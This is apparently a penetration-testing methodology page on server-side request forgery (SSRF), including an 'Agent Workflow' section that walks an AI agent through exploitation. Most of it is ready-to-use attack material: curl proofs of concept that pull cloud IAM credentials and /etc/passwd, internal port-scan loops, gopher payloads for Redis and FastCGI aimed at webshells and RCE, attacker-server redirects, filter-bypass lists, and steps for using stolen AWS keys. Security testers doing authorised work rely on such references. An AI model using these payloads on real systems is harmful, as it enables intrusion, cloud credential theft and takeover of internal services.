# SSRF (Server-Side Request Forgery)

> **Summary**: Attacker manipulates a server-side application into making HTTP/network requests to an unintended destination, such as internal services or cloud metadata APIs.
> **Impact**: Internal network reconnaissance, access to cloud credentials (IAM keys), reading local files, RCE via internal services, bypassing firewalls/ACLs.
> **Typical Severity**: High | Critical

---

## Detection

### Indicators
- Application fetches URLs provided by the user (import from URL, webhooks, PDF generators, image proxies)
- Server makes outbound requests based on user input (URL parameters, file paths, hostnames)
- Referrer header, SNI field, or redirect targets processed server-side
- Response contains internal hostnames, IPs, or error messages from backend services

### Automated Detection
```bash
# Interactsh - detect out-of-band interactions
# https://github.com/projectdiscovery/interactsh
interactsh-client

# Burp Collaborator Everywhere - detect blind SSRF via headers
# Install via BApp Store, triggers on Referer, Origin, X-Forwarded-For, etc.
```

### Manual Detection
1. Identify parameters that accept URLs or hostnames (e.g., `url=`, `callback=`, `redirect=`, `dest=`, `uri=`, `path=`, `img=`, `src=`)
2. Replace the value with a Burp Collaborator / interactsh URL
3. Check for DNS lookup, HTTP callback, or different response times
4. Test file:// and other protocols for broader SSRF confirmation

---

## Exploitation

### Prerequisites
- Application accepts a URL/hostname/IP from user input
- Server-side code fetches or connects to the supplied address
- Insufficient validation of the destination (no allowlist, or bypassable blocklist)

### SSRF Types

| Type | Description | Detection |
|------|-------------|-----------|
| Basic SSRF | Response from internal request returned to attacker | Content in response |
| Blind SSRF | Request is made but response is not returned | OOB callback (DNS/HTTP) |
| Partial SSRF | Only part of the URL is controllable | Limited exploitation |

### Step-by-Step

1. **Identify the injection point** - find where the application accepts URLs or makes server-side requests
2. **Confirm SSRF** - point the request to an external callback server (Burp Collaborator, interactsh)
3. **Test protocol support** - try `http://`, `https://`, `file://`, `gopher://`, `dict://`
4. **Access internal services** - request `http://127.0.0.1`, `http://169.254.169.254`, internal IPs
5. **Exfiltrate data** - cloud metadata, internal service responses, local files
6. **Escalate** - use retrieved credentials for lateral movement

**Success criteria**: Ability to make the server request internal resources or exfiltrate internal data

### Protocols

| Protocol | Usage | Example |
|----------|-------|---------|
| `http://` | Standard web requests to internal services | `http://127.0.0.1/admin` |
| `file://` | Read local files | `file:///etc/passwd` |
| `gopher://` | Craft raw TCP payloads (SMTP, Redis, MySQL) | `gopher://127.0.0.1:6379/_INFO` |
| `dict://` | Interact with DICT protocol services | `dict://<HOST>:<PORT>/info` |
| `sftp://` | Connect to SFTP servers | `sftp://<HOST>:22/` |
| `tftp://` | Send UDP TFTP requests | `tftp://<HOST>:69/file` |
| `ldap://` | Interact with LDAP services | `ldap://localhost:389/` |

### Gopher Protocol for Internal Service Exploitation
Use [Gopherus](https://github.com/tarunkant/Gopherus) to generate payloads for:
- **Redis**: Write webshell, cron job, or SSH keys
- **MySQL**: Execute queries as unauthenticated user
- **SMTP**: Send forged emails
- **FastCGI**: Execute PHP code

```bash
# Gopher HTTP request
gopher://<SERVER>:8080/_GET%20/%20HTTP/1.0%0A%0A

# Gopher POST request
gopher://<SERVER>:8080/_POST%20/admin%20HTTP/1.0%0AContent-Type:%20application/x-www-form-urlencoded%0AContent-Length:%2013%0A%0Aparam%3Dvalue
```

### Cloud Metadata Endpoints

#### AWS (IMDSv1)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/hostname
```

> IMDSv2 requires a PUT request with `X-aws-ec2-metadata-token-ttl-seconds` header to get a token first, making it harder to exploit via basic SSRF. It also blocks requests with `X-Forwarded-For` header and has hop limit of 1.

#### AWS ECS
```
http://169.254.170.2/v2/credentials/<GUID>
# GUID from: file:///proc/self/environ (AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
```

#### AWS Lambda
```
file:///proc/self/environ
# Contains: AWS_SESSION_TOKEN, AWS_SECRET_ACCESS_KEY, AWS_ACCESS_KEY_ID
http://localhost:9001/2018-06-01/runtime/invocation/next
```

#### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Requires header: Metadata-Flavor: Google
```

#### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

#### DigitalOcean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
```

#### Alibaba Cloud
```
http://100.100.100.200/latest/meta-data/
```

**DNS shortcuts via interactsh:**
```
aws.interact.sh       -> 169.254.169.254
alibaba.interact.sh   -> 100.100.100.200
```

### Proof of Concept
```bash
# Basic SSRF to read cloud credentials
curl "https://<TARGET>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>"

# File read
curl "https://<TARGET>/fetch?url=file:///etc/passwd"

# Port scan
for port in 80 443 8080 3306 6379 27017; do
  curl "https://<TARGET>/fetch?url=http://127.0.0.1:$port" -o /dev/null -w "%{http_code} port:$port\n" -s
done
```

---

## Bypasses

### Localhost Obfuscation
```
127.0.0.1                         # Standard
127.1                             # Shortened
127.0.0.0 - 127.255.255.255      # Entire /8 block
0.0.0.0                           # All zeros
0                                 # Just zero
2130706433                        # Decimal (127.0.0.1)
0x7f000001                        # Hex
0177.0000.0000.0001               # Octal
0x7f.0x0.0x0.0x1                  # Dotted hex
017700000001                      # Full octal
::1                               # IPv6 loopback
0:0:0:0:0:0:0:1                   # IPv6 expanded
::ffff:127.0.0.1                  # IPv4-mapped IPv6
0:0:0:0:0:ffff:7f000001           # IPv4-mapped IPv6 hex
127.000000000000000.1             # Padded with zeros
```

### Mixed Encoding
```
0xA9.254.0251.0376                # Hex + decimal + octal
169.254.43518                     # Partial decimal (Class B)
```

### DNS Resolution Bypass
```bash
# Domains that resolve to 127.0.0.1
localtest.me
spoofed.burpcollaborator.net
127.0.0.1.nip.io
customer1.app.localhost.my.company.127.0.0.1.nip.io
```

### DNS Rebinding
A hostname alternates between a safe IP and an internal IP with very low TTL. The server validates the first resolution (safe), then the second resolution (internal) is used for the actual request.

Tool: [rebinder](https://lock.cmpxchg8b.com/rebinder.html)

### HTTP Redirect Bypass
Host a redirect on your server that points to the internal target:
```php
<?php header('Location: http://127.0.0.1/admin'); ?>
```
Then supply `http://<YOUR_SERVER>/redirect.php` as the URL.

### URL Parser Differentials
```
https://attacker.com@127.0.0.1    # Userinfo before host
http://127.0.0.1#@attacker.com    # Fragment confusion
http://127.0.0.1%2523@attacker.com
https:/attacker.com               # Missing slash
http:/\/\attacker.com             # Backslash tricks
```

### Enclosed Alphanumerics (Unicode)
```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
```
Convert at: [Unicode Converter](http://qaz.wtf/u/convert.cgi)

### SSRF via Non-Standard Vectors
- **Referrer header**: analytics software may fetch URLs from the Referer header
- **SNI field**: misconfigured Nginx `proxy_pass $ssl_preread_server_name` can be SSRF'd via TLS SNI
- **SVG/XML uploads**: embedded `<image xlink:href="http://internal/">` in SVG files
- **PDF generation**: HTML-to-PDF converters that fetch external resources
- **Webhook features**: application allows setting callback URLs

### IP Converter Tool
[https://h.43z.one/ipconverter/](https://h.43z.one/ipconverter/)

### Redirect Service
[https://ssrf.localdomain.pw](https://ssrf.localdomain.pw/)
```
https://ssrf.localdomain.pw/csv-with-body/301-http-169.254.169.254:80-.c.csv
https://ssrf.localdomain.pw/img-with-body/301-http-169.254.169.254:80-.i.jpg
```

### Curl URL Globbing (WAF Bypass)
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```

---

## Escalation
- **Cloud credential theft**: use SSRF to access metadata services, retrieve IAM keys, escalate in cloud
- **Internal service exploitation**: access Redis, Elasticsearch, Kubernetes API, Docker API
- **RCE via Gopher**: send crafted payloads to internal services (Redis SLAVEOF, FastCGI, SMTP)
- **Pivot to internal network**: use the server as a proxy to scan and exploit internal hosts
- **Data exfiltration**: read configuration files, environment variables, database credentials
- Chain with: [Open Redirect](open-redirect.md), [XXE](xxe.md), [LFI](lfi.md)

---

## Tools

| Tool | Usage |
|------|-------|
| [Gopherus](https://github.com/tarunkant/Gopherus) | Generate gopher payloads for Redis, MySQL, SMTP, FastCGI |
| [SSRFmap](https://github.com/swisskyrepo/SSRFmap) | Automated SSRF exploitation framework |
| [Interactsh](https://github.com/projectdiscovery/interactsh) | OOB interaction detection |
| [Burp Collaborator](https://portswigger.net/) | Detect blind SSRF via DNS/HTTP callbacks |
| [Collaborator Everywhere](https://portswigger.net/bappstore) | Burp extension for header-based SSRF |
| [Burp-Encode-IP](https://github.com/e1abrador/Burp-Encode-IP) | IP encoding bypass automation |
| [malicious-pdf](https://github.com/jonaslejon/malicious-pdf) | `python3 malicious-pdf.py <CALLBACK_URL>` |
| [sslip.io](https://sslip.io/) | Wildcard DNS for IP-based subdomains |
| [nip.io](https://nip.io/) | DNS wildcard for any IP |

---

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery

1. **Identify URL-accepting parameters**
   ```bash
   # Crawl the application for endpoints
   katana -u <TARGET_URL> -d 3 -jc -o katana_output.txt

   # Collect historical URLs
   gau <TARGET_DOMAIN> --threads 5 --o gau_output.txt

   # Merge and filter for URL-like parameters
   cat katana_output.txt gau_output.txt | uro | sort -u > all_urls.txt
   ```
   - Search for parameters commonly vulnerable to SSRF: `url=`, `path=`, `next=`, `redirect=`, `callback=`, `dest=`, `uri=`, `img=`, `src=`, `href=`, `link=`, `feed=`, `to=`, `out=`, `view=`, `page=`, `site=`, `fetch=`, `load=`, `proxy=`, `webhook=`.
   - Also check for SSRF vectors in: PDF generation features, image import/resize, URL preview/unfurl, webhook configuration, file import from URL, HTML-to-PDF converters.

2. **Start an out-of-band interaction server**
   ```bash
   interactsh-client -v
   # Note the generated domain: <INTERACTSH_DOMAIN>
   ```
   - Alternatively, use Burp Collaborator: copy the collaborator URL from Burp Suite.

3. **Send initial SSRF probes** to each identified parameter:
   ```
   # Replace parameter value with callback URL
   url=http://<INTERACTSH_DOMAIN>
   url=https://<INTERACTSH_DOMAIN>
   ```
   - **Expected output**: DNS or HTTP callback received on interactsh/Collaborator.
   - **Decision**: If callback received, SSRF confirmed -- proceed to Phase 2. If no callback, test with different protocols and bypass techniques.

4. **Test HTTP headers for blind SSRF**
   - Inject callback URLs into: `Referer`, `X-Forwarded-For`, `Origin`, `X-Original-URL`, `X-Rewrite-URL`.
   - Install and use **Collaborator Everywhere** Burp extension for automated header injection.

### Phase 2: Validation

5. **Classify SSRF type**:
   - **If** the response body contains the fetched content (e.g., HTML from the callback server): **Direct/Basic SSRF** -- full response is returned.
   - **If** only a DNS/HTTP callback is received but no response content: **Blind SSRF** -- no data is returned.
   - **If** only part of the URL is controllable (e.g., path appended to fixed host): **Partial SSRF** -- limited exploitation.

6. **Test protocol support** (for direct and blind SSRF):
   ```
   url=http://127.0.0.1/
   url=https://127.0.0.1/
   url=file:///etc/passwd
   url=gopher://127.0.0.1:6379/_INFO
   url=dict://127.0.0.1:6379/INFO
   ```
   - **Decision**: If `file://` works, proceed to file read. If `gopher://` works, proceed to internal service exploitation. If only `http://` works, focus on HTTP-based internal access.

7. **If initial probes are blocked, attempt bypass**:
   - Localhost obfuscation: `127.1`, `2130706433`, `0x7f000001`, `0177.0.0.1`, `::1`, `::ffff:127.0.0.1`
   - DNS resolution bypass: `127.0.0.1.nip.io`, `localtest.me`, `spoofed.burpcollaborator.net`
   - URL parser differentials: `https://attacker.com@127.0.0.1`, `http://127.0.0.1#@attacker.com`
   - HTTP redirect bypass: host a redirect on `<ATTACKER_SERVER>` pointing to `http://127.0.0.1/admin`
   - DNS rebinding: use `rebinder` to alternate between safe IP and `127.0.0.1`
   - Enclosed alphanumerics / Unicode: `http://<ENCODED_LOCALHOST>/`

### Phase 3: Exploitation

8. **Access cloud metadata endpoints** (if target is hosted on cloud):
   ```
   # AWS IMDSv1
   url=http://169.254.169.254/latest/meta-data/
   url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

   # GCP (requires Metadata-Flavor: Google header -- may not work via basic SSRF)
   url=http://metadata.google.internal/computeMetadata/v1/

   # Azure (requires Metadata: true header)
   url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
   ```
   - **Expected output**: AWS IAM credentials (AccessKeyId, SecretAccessKey, Token), instance metadata, or user-data scripts.
   - **Decision**: If IMDSv2 is enforced (requires PUT + token), the basic SSRF will fail for AWS metadata. Try `file:///proc/self/environ` for Lambda environments to get credentials from environment variables.

9. **Scan internal services** (for direct SSRF):
   ```bash
   # Port scan via SSRF
   for port in 80 443 8080 8443 3000 3306 5432 6379 9200 27017 11211; do
     curl "<TARGET_URL>?url=http://127.0.0.1:$port" -o /dev/null -w "%{http_code} port:$port\n" -s
   done
   ```
   - **Expected output**: Different HTTP status codes or response sizes indicating open internal ports.

10. **Exploit internal services via gopher** (if gopher:// is supported):
    ```bash
    # Generate Redis payload with Gopherus
    python2 gopherus.py --exploit redis

    # Generate FastCGI payload
    python2 gopherus.py --exploit fastcgi

    # Submit the generated gopher:// URL through the SSRF parameter
    ```

11. **For blind SSRF**, exfiltrate data via DNS:
    ```
    url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ --> response stored internally
    # If redirect is possible: chain redirect to DNS exfiltration
    ```

### Phase 4: Escalation

12. **Use stolen cloud credentials** for lateral movement:
    ```bash
    # Configure AWS CLI with stolen credentials
    export AWS_ACCESS_KEY_ID=<STOLEN_KEY>
    export AWS_SECRET_ACCESS_KEY=<STOLEN_SECRET>
    export AWS_SESSION_TOKEN=<STOLEN_TOKEN>

    # Enumerate permissions
    aws sts get-caller-identity
    aws s3 ls
    aws ec2 describe-instances
    aws iam list-roles
    ```

13. **Chain SSRF with other vulnerabilities**:
    - SSRF + Redis --> write webshell via `CONFIG SET dir` / `CONFIG SET dbfilename` (use gopher payload)
    - SSRF + Kubernetes API --> `http://127.0.0.1:10250/pods` for container escape
    - SSRF + Docker API --> `http://127.0.0.1:2375/containers/json` for container listing
    - SSRF + Elasticsearch --> `http://127.0.0.1:9200/_cat/indices` for data access
    - SSRF + internal admin panel --> access unauthenticated admin interfaces

14. **RCE via internal services**:
    - Redis: Write cron job or SSH key via `SLAVEOF` or `CONFIG SET`
    - FastCGI: Execute PHP code via gopher payload to port 9000
    - SMTP: Send phishing emails via gopher payload to port 25

## Decision Tree

```
START: Identify URL-accepting parameters and features
  |
  +-- Parameter accepts URL input?
  |     |
  |     +-- YES --> Submit http://<INTERACTSH_DOMAIN> as value
  |     |            |
  |     |            +-- Callback received?
  |     |            |     |
  |     |            |     +-- YES --> SSRF confirmed
  |     |            |     |     |
  |     |            |     |     +-- Response body contains fetched content?
  |     |            |     |     |     +-- YES --> DIRECT SSRF
  |     |            |     |     |     |     +-- Test file:// --> file read
  |     |            |     |     |     |     +-- Test gopher:// --> internal service exploitation
  |     |            |     |     |     |     +-- Access 169.254.169.254 --> cloud metadata
  |     |            |     |     |     |     +-- Scan internal ports
  |     |            |     |     |     |
  |     |            |     |     |     +-- NO --> BLIND SSRF
  |     |            |     |     |           +-- Test internal port scan (response time/size diff)
  |     |            |     |     |           +-- Test cloud metadata with redirect chain
  |     |            |     |     |           +-- Use gopher for internal exploitation
  |     |            |     |     |
  |     |            |     |     +-- Only part of URL controllable?
  |     |            |     |           +-- PARTIAL SSRF
  |     |            |     |           +-- Test path traversal: /../../../etc/passwd
  |     |            |     |           +-- Test @-based host override
  |     |            |     |
  |     |            |     +-- NO --> Apply bypass techniques
  |     |            |           +-- Localhost obfuscation (127.1, decimal, hex, IPv6)
  |     |            |           +-- DNS bypass (nip.io, localtest.me)
  |     |            |           +-- URL parser confusion (@, #, backslash)
  |     |            |           +-- HTTP redirect via attacker server
  |     |            |           +-- DNS rebinding
  |     |            |           +-- Retry --> callback received? --> proceed as above
  |     |            |           +-- Still no callback? --> SSRF not exploitable
  |     |
  |     +-- NO --> Check for indirect SSRF vectors
  |           +-- Test headers (Referer, X-Forwarded-For)
  |           +-- Test file upload (SVG with xlink:href)
  |           +-- Test PDF generation features
  |           +-- Test webhook configurations
```

## Success Criteria

- **Confirmed SSRF**: Burp Collaborator or interactsh receives an HTTP/DNS callback from the target server.
- **Direct SSRF validated**: Internal resource content (e.g., localhost admin page, metadata endpoint) is returned in the response body.
- **Blind SSRF validated**: Callback received, and internal port scan reveals open services via response time or status code differences.
- **Cloud credentials stolen**: AWS IAM keys, GCP tokens, or Azure managed identity tokens retrieved from metadata endpoints.
- **Internal service exploited**: Redis, Elasticsearch, Kubernetes API, or Docker API accessed through SSRF.
- **RCE achieved**: Webshell written via Redis, command executed via FastCGI, or reverse shell established via internal service exploitation.

---

## References

| URL | Description |
|-----|-------------|
| [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) | Comprehensive SSRF methodology |
| [PortSwigger SSRF](https://portswigger.net/web-security/ssrf) | SSRF labs and learning |
| [AllThingsSSRF](https://github.com/jdonsec/AllThingsSSRF) | SSRF resource collection |
| [Blind SSRF Chains](https://github.com/assetnote/blind-ssrf-chains) | Exploiting blind SSRF with internal services |
| [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery) | Payload repository |
| [Automating SSRF Discovery](https://dant0x65.medium.com/bug-bounty-tip-automating-ssrf-ea344ec59962) | Burp-based SSRF automation |
| [Cloud Metadata SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf) | Cloud-specific SSRF techniques |
| [URL Format Bypass](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass) | IP and URL encoding bypasses |
